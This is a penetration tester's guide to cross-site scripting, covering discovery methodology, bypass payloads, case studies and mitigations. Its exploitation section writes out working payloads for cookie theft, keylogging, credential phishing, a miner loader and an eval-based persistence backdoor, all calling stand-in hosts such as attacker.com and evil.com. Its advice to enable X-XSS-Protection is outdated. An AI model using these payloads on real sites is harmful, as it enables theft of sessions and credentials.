# Understanding and Exploiting XSS Vulnerabilities: A Penetration Tester's Guide

Cross-Site Scripting (XSS) remains one of the most prevalent web application security vulnerabilities despite being well-documented for over two decades. As a penetration tester, understanding how to identify, exploit, and mitigate XSS vulnerabilities is essential for protecting web applications and their users.

This article provides a detailed examination of XSS vulnerabilities from a penetration tester's perspective, focusing on methodology for discovery and the potential impacts of successful exploitation.

## What is Cross-Site Scripting (XSS)?

XSS is a client-side injection vulnerability that allows attackers to execute malicious JavaScript code in victims' browsers. When a web application includes user-supplied data in its responses without proper validation or encoding, attackers can inject scripts that execute in the context of other users' browsing sessions.

## Types of XSS Vulnerabilities

Before diving into detection methodologies, it's important to understand the three main types of XSS vulnerabilities:

### 1. Reflected XSS

Reflected XSS occurs when user input is immediately returned by a web application without proper sanitization. The attack is typically delivered via a crafted link containing malicious script, which is then reflected in the victim's browser when they click the link.

### 2. Stored XSS

Stored XSS (also known as persistent XSS) occurs when the malicious script is saved on the target server and later displayed to other users. Common targets include comment sections, user profiles, and message boards.

### 3. DOM-based XSS

DOM-based XSS exploits client-side JavaScript that dynamically manipulates the Document Object Model (DOM) using unsafe data. Unlike the other types, DOM-based XSS might not involve server-side processing at all, making it harder to detect with traditional scanning tools.

## Methodology for XSS Discovery

### 1. Reconnaissance and Attack Surface Mapping

The first step in discovering XSS vulnerabilities is identifying all entry points where user input could be processed and displayed:

- URL parameters and query strings
- Form fields
- HTTP headers (especially User-Agent, Referer, Cookie)
- File upload functionality
- JSON/XML payloads in AJAX requests
- WebSocket communications

**Example of attack surface mapping:**

For a target website `https://example.com`, you might enumerate:
- All GET parameters: `?search=`, `?id=`, `?redirect=`
- All POST forms: login, comment, contact, search
- User content areas: profiles, comments, reviews
- Custom HTTP headers accepted by the application

### 2. Input Validation Testing

Once you've identified potential entry points, systematically test each one with various payloads to determine if and how user input is validated, encoded, or sanitized.

#### Basic XSS Test Payloads

Start with simple payloads to test for basic filtering:

```javascript
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
<body onload="alert('XSS')">
```

#### Filter Bypass Techniques

If basic payloads are blocked, try various evasion techniques:

**Case manipulation:**
```javascript
<ScRiPt>alert('XSS')</sCrIpT>
```

**Encoding variations:**
```javascript
<script>alert(String.fromCharCode(88,83,83))</script>
```

**HTML entity encoding:**
```javascript
&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
```

**JavaScript protocol in attributes:**
```html
<a href="javascript:alert('XSS')">Click me</a>
```

**Event handlers:**
```html
<div onmouseover="alert('XSS')">Hover over me</div>
```

### 3. Automated Scanning

Use specialized tools to automate the discovery process:

- **OWASP ZAP**: Open-source integrated penetration testing tool
- **Burp Suite**: Industry-standard web application security testing platform
- **XSStrike**: Python-based XSS scanning suite
- **Nuclei**: Template-based vulnerability scanner

**Example Burp Suite workflow:**

1. Capture a request in Burp Proxy
2. Send to Intruder
3. Define payload positions (parameters, headers)
4. Load XSS payload list
5. Start attack and analyze responses

### 4. Manual Verification

Automated tools can miss contextual vulnerabilities, so manual verification is crucial:

1. Examine the application's response to see how and where your input appears
2. Understand the context (HTML body, attribute, JavaScript string, etc.)
3. Craft context-specific payloads
4. Test browser rendering and script execution

#### Context-Specific Testing

**HTML Context:**
```html
<div>USER_INPUT</div>
```
Try: `<script>alert(1)</script>`

**HTML Attribute Context:**
```html
<input type="text" value="USER_INPUT">
```
Try: `" onmouseover="alert(1)`

**JavaScript Context:**
```html
<script>
var data = "USER_INPUT";
</script>
```
Try: `";alert(1);//`

**CSS Context:**
```html
<style>
body {
  background: USER_INPUT;
}
</style>
```
Try: `expression(alert(1))`

### 5. DOM XSS Testing

Testing for DOM-based XSS requires a different approach:

1. Review client-side JavaScript code for sources and sinks
2. Sources include: `location.href`, `document.URL`, `document.referrer`
3. Sinks include: `document.write()`, `innerHTML`, `eval()`

**Example vulnerable code:**

```javascript
// Vulnerable code
var pos = document.URL.indexOf("name=") + 5;
var name = document.URL.substring(pos);
document.write("Welcome, " + name + "!");
```

**Test payload:**
```
https://example.com/page.html?name=<script>alert(document.cookie)</script>
```

### 6. Blind XSS Detection

Blind XSS vulnerabilities only trigger in environments you can't directly observe, such as admin panels. Testing requires:

1. Use payloads that call back to your server
2. Monitor for incoming connections

**Example blind XSS payload:**
```html
<script src="https://your-server.com/xss.js"></script>
```

With xss.js containing:
```javascript
fetch('https://your-server.com/collector', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    location: document.location.href,
    localStorage: JSON.stringify(localStorage),
    DOM: document.documentElement.outerHTML
  })
});
```

## Exploiting XSS Vulnerabilities

Once identified, XSS vulnerabilities can be exploited in various ways. Here are detailed exploitation techniques:

### 1. Session Hijacking

The most common XSS attack goal is stealing user session information:

```javascript
// Steal cookies
var img = new Image();
img.src = "https://attacker.com/collect?cookie=" + encodeURIComponent(document.cookie);
```

**Note:** Modern applications often set the `HttpOnly` flag on cookies, preventing JavaScript access.

### 2. Keylogging

Capture keystrokes entered after the XSS payload executes:

```javascript
var keys = '';
document.onkeypress = function(e) {
  keys += e.key;
  // Send every 50 characters
  if(keys.length >= 50) {
    var img = new Image();
    img.src = "https://attacker.com/k?c=" + encodeURIComponent(keys);
    keys = '';
  }
};
```

### 3. Phishing

Use XSS to display fake login forms and steal credentials:

```javascript
document.body.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:10000">
    <h2>Session expired, please login again</h2>
    <form id="fakelogin">
      Username: <input type="text" name="username"><br>
      Password: <input type="password" name="password"><br>
      <button type="submit">Login</button>
    </form>
  </div>
`;

document.getElementById('fakelogin').onsubmit = function(e) {
  e.preventDefault();
  var u = this.username.value;
  var p = this.password.value;
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({username: u, password: p})
  });
  
  // Redirect to hide the attack
  window.location = "https://legitimate-site.com/login";
};
```

### 4. Network Scanning

Use the victim's browser to scan internal networks:

```javascript
// Check if internal service exists
function checkPort(ip, port) {
  var start = new Date().getTime();
  var img = new Image();
  img.onerror = function() {
    var elapsed = new Date().getTime() - start;
    if (elapsed < 2) {
      // Port is closed or filtered
    } else {
      // Port might be open
      sendResult(ip, port, 'open');
    }
  };
  img.src = 'http://' + ip + ':' + port;
}

// Scan common ports on internal IP range
for (let i = 1; i < 10; i++) {
  checkPort('192.168.1.' + i, 8080);
  checkPort('192.168.1.' + i, 3389);
  checkPort('192.168.1.' + i, 22);
}
```

### 5. Virtual Defacement

Modify the page content to display false information:

```javascript
document.body.innerHTML = '<h1>This site has been hacked</h1>';
```

### 6. Cryptomining

Use the victim's CPU for cryptocurrency mining:

```javascript
var script = document.createElement('script');
script.src = 'https://attacker.com/miner.js';
document.body.appendChild(script);
```

### 7. Advanced Persistent Threats

Use XSS to establish persistence in the victim's browser:

```javascript
// Store payload in various storage mechanisms
localStorage.setItem('_sys_cache', 'fetch("https://evil.com/backdoor.js").then(r=>r.text()).then(t=>eval(t))');

// Execute on page load
function persist() {
  try {
    eval(localStorage.getItem('_sys_cache'));
  } catch(e) {}
}

// Set up mutations observer to re-infect DOM
var observer = new MutationObserver(function() {
  // Re-inject payload if it gets removed
  if (!document.querySelector('#_sys_frame')) {
    persist();
  }
});
observer.observe(document, {childList: true, subtree: true});
```

## Real-world XSS Testing Case Studies

### Case Study 1: Finding XSS in Search Functionality

A financial services website had a search feature that displayed the search query on the results page:

```html
<div class="results-heading">
  Search results for: USER_QUERY
</div>
```

**Vulnerability discovery:**
1. Entered the search query: `"><img src=x onerror=alert(1)>`
2. The application rendered:
```html
<div class="results-heading">
  Search results for: "><img src=x onerror=alert(1)>
</div>
```
3. The payload executed, confirming the vulnerability

**Impact assessment:**
The vulnerability was exploitable via crafted links, allowing sessions to be hijacked when users clicked on malicious search links.

### Case Study 2: DOM-Based XSS in Single-Page Application

A modern SPA used client-side rendering with a router that processed URL fragments:

```javascript
// Vulnerable code
function updateWelcomeMessage() {
  var name = location.hash.substring(1) || "Guest";
  document.getElementById('welcome').innerHTML = "Welcome, " + name + "!";
}
window.addEventListener('hashchange', updateWelcomeMessage);
updateWelcomeMessage();
```

**Vulnerability discovery:**
1. Analyzed client-side JavaScript
2. Identified the unsafe use of `innerHTML` with user-controlled data
3. Tested with URL: `https://example.com/app#<img src=x onerror=alert(document.domain)>`
4. Payload executed when the page loaded and triggered the welcome message update

**Impact assessment:**
The vulnerability allowed any JavaScript execution in the application context without server-side interaction, making it particularly dangerous.

## Mitigation Strategies

As a penetration tester, providing mitigation advice is as important as finding vulnerabilities:

### 1. Input Validation

Implement strong input validation on both client and server sides:

```javascript
// Whitelist validation example
function isValidInput(input) {
  return /^[a-zA-Z0-9\s\.,]+$/.test(input);
}
```

### 2. Output Encoding

Always encode output based on the context:

**HTML Context:**
```javascript
function htmlEncode(input) {
  return input.replace(/&/g, '&amp;')
              .replace(/</g, '&lt;')
              .replace(/>/g, '&gt;')
              .replace(/"/g, '&quot;')
              .replace(/'/g, '&#x27;');
}
```

**JavaScript Context:**
```javascript
function jsEncode(input) {
  return JSON.stringify(input).slice(1, -1)
              .replace(/</g, '\\u003c');
}
```

### 3. Content Security Policy (CSP)

Implement a strong CSP to restrict script execution:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none';
```

### 4. Modern Framework Usage

Use frameworks that automatically escape output:

```jsx
// React example - automatically escapes variables
function SafeComponent({ userInput }) {
  return <div>{userInput}</div>;
}
```

### 5. X-XSS-Protection Header

Enable browser's built-in XSS protection:

```
X-XSS-Protection: 1; mode=block
```

### 6. Secure Cookies

Protect cookies from JavaScript access:

```
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

## Conclusion

Cross-Site Scripting remains a critical vulnerability in modern web applications. As penetration testers, our role involves not just finding these vulnerabilities but understanding their full impact and providing effective remediation advice.

The methodology outlined in this article provides a systematic approach to discovering XSS across different contexts and application architectures. By combining automated scanning with targeted manual testing and understanding the exploitation techniques, you can effectively identify and demonstrate the risks of XSS vulnerabilities to your clients.

Remember that the goal of penetration testing is not just to find vulnerabilities, but to help organizations build more secure applications. Documentation of findings, clear impact demonstrations, and actionable remediation advice are all essential components of effective XSS testing.
